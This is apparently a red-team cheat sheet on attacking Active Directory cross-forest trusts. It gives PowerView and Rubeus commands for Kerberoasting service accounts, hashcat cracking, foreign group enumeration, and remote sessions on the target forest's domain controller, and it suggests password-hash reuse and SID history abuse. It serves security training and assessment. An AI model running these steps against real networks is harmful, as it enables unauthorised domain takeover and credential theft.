# Attacking Domain Trusts — Cross-Forest Trust Abuse (Windows)

Requires bidirectional forest trust (or inbound trust into target forest). SID filtering applies cross-forest by default — ExtraSids attack is blocked. Different attack surface than child→parent.

---

## Cross-Forest Kerberoasting

Enumerate SPN accounts in the trusted forest:

```powershell
Get-DomainUser -SPN -Domain <TARGET_FOREST> | select SamAccountName
```

Check group membership on any SPN accounts found — DA in target forest = priority target:

```powershell
Get-DomainUser -Domain <TARGET_FOREST> -Identity <USER> | select samaccountname,memberof
```

Kerberoast across the trust with Rubeus:

```powershell
.\Rubeus.exe kerberoast /domain:<TARGET_FOREST> /user:<USER> /nowrap
```

Crack with hashcat mode 13100 as normal. Cracked DA hash in target forest = full access to both forests.

---

## Foreign Group Membership

Check if users from your domain are members of privileged groups in the trusted forest:

```powershell
Get-DomainForeignGroupMember -Domain <TARGET_FOREST>
```

Resolve returned SIDs to account names:

```powershell
Convert-SidToName <SID>
```

If your domain's Administrator (or any DA) is in the `Administrators` group of the target forest — you already have admin access there, no attack needed:

```powershell
Enter-PSSession -ComputerName <TARGET_FOREST_DC> -Credential <YOUR_DOMAIN>\administrator
```

---

## Password Reuse Across Forests

After taking Domain A, check if DA/EA accounts or named admin accounts have matching usernames in Domain B and try the same password or NT hash. Also check for username pattern variants (`adm_bob.smith` → `bsmith_admin`).

---

## SID History Abuse — Cross-Forest

Only viable if SID filtering is disabled on the cross-forest trust (non-default). If a migrated account has a SID from an admin account in the source forest in its `sidHistory`, it retains those rights across the trust. Check for this on any migrated user accounts found during enum.

> [!tip] Foreign group membership is the highest-ROI check on any bidirectional forest trust — if your domain's admin is already in the target's Administrators group, you own the second forest without any additional attack.

> [!warning] SID filtering is enabled by default on cross-forest trusts, blocking ExtraSids injection. Don't waste time attempting it unless you've confirmed `SIDFilteringQuarantined: False` on the trust object.